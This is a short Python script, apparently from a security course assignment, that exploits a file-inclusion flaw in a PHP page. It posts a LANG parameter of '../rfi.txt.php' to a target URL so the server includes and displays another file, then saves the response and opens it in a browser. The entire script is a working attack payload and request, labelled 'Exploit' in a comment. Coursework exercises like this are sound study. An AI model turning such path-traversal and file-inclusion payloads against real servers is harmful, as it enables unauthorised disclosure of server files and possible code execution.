import requests
import webbrowser

# Exploit: change the LANG to ../rfi.txt.php and server will write file contents
# to the webpage
# Remote File Inclusion

def main():
    temp = '/tmp/case03.html'
    payload = {'LANG':'../rfi.txt.php'}

    r = requests.post('http://wsb.com/Assignment2/case03/case03.php', data=payload)
    with open(temp, 'wb') as f:
        f.write(r.content)
    webbrowser.open(temp, 2)

if __name__ == "__main__":
    main()
